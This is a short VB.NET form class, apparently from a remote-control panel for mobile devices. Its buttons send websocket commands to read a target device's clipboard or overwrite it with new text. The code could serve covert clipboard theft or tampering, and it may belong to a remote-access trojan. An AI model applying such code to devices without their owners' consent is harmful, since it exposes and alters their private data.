Imports System.Net.Sockets

Public Class Clipboard
    Public mobid As String
    Private Sub logclipboard_TextChanged(sender As Object, e As EventArgs) Handles logclipboard.TextChanged
        setbtn.Enabled = True
    End Sub

    Private Sub getbtn_Click(sender As Object, e As EventArgs) Handles getbtn.Click
        Dim chatData As New Dictionary(Of String, Object) From {
                            {"msg", "clip"},
                            {"cas", "0"}
        }
        BTEngine.commands(chatData, mobid, BTEngine.MainForm.webSocketClient)

    End Sub

    Private Sub setbtn_Click(sender As Object, e As EventArgs) Handles setbtn.Click
        If MyMsg.Show("Save changes", "Update clipboard Content ?", msgtype.Confirm, True) <> DialogResult.OK Then
            Return
        End If
        Dim chatData As New Dictionary(Of String, Object) From {
                            {"msg", "clip"},
                            {"cas", "1"},
                            {"tost", logclipboard.Text}
        }
        BTEngine.commands(chatData, mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub Clipboard_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        logclipboard.AutoWordSelection = False
        Me.mytitle.Text = clipbstr
    End Sub
End Class